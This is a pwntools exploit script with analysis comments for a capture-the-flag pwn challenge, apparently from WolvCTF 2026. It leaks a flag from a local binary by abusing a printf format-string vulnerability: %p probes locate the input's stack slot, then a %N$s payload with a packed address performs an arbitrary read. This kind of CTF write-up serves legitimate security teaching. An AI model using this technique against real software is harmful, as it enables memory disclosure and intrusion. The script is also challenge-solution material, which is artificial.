"""
title: Comment cart
ctf: WolvCTF 2026
category: pwn
difficulty: 2
arch: amd64
linking: dynamic
mitigation_gaps: [no-canary, no-pie, not-stripped]
vulnerabilities: [format-string]
tags: [arbitrary-read]
"""
from pwn import *
import re

# =====
# ANALYSIS
# =====
# Dynamically linked, no PIE. The flag is loaded into .bss at startup, at a
# fixed address (no PIE means no leak needed to reference it).
# feedbackKiosk() prints user input straight through printf, a format string
# vulnerability usable as an arbitrary read.
# Plan: first find which printf parameter index maps to the start of the
# input, then use %N$s on that slot to dereference and print the flag address.

# =====
# CONSTANTS
# =====
BSS_FLAG_ADDR = 0x404040         # fixed .bss address where the flag is stored
MARKER = b"AAAAAAAA"             # recognisable 8-byte word to locate the input
NEEDLE = b"0x4141414141414141"   # MARKER as printed by %p, used to find its index

# =====
# EXPLOIT
# =====

# --- Step 1: find the parameter index of our input ---

# Send the marker followed by 20 %p to dump stack slots, separated by '.'.
payload = MARKER + b"%p." * 20
p = process("./chal")
p.sendline(payload)

# Collect the output of this one-shot exploration run.
output = p.recvall(timeout=1)

# Split on '.' and find the slot that printed the marker back.
output_arr = output.split(b".")
param_index = output_arr.index(next(f for f in output_arr if NEEDLE in f))

# printf positional specifiers start at 1.
param_index += 1
print(f"{param_index=}")  # here: 6
p.close()

# --- Step 2: leak the flag ---

# TRAP: putting the address first breaks the read, its trailing null bytes
# make printf stop before reaching the %s. So send the specifier first and
# place the address on the NEXT slot (marker was at slot 6, address lands at 7).
target = param_index + 1
payload = f"%{target}$s".encode().ljust(8, b"A") + p64(BSS_FLAG_ADDR)

# Spawn a fresh process and send the leak payload.
p = process("./chal")
p.sendline(payload)

# --- Flag ---

# Extract the flag from the program output.
output = p.recvall(timeout=5)
match = re.search(rb"wctf\{[^}]*\}", output)
if match:
    print(f"Found flag: {match.group(0).decode()}")
else:
    print("Flag not found in the output:")
    print(output.decode(errors="replace"))
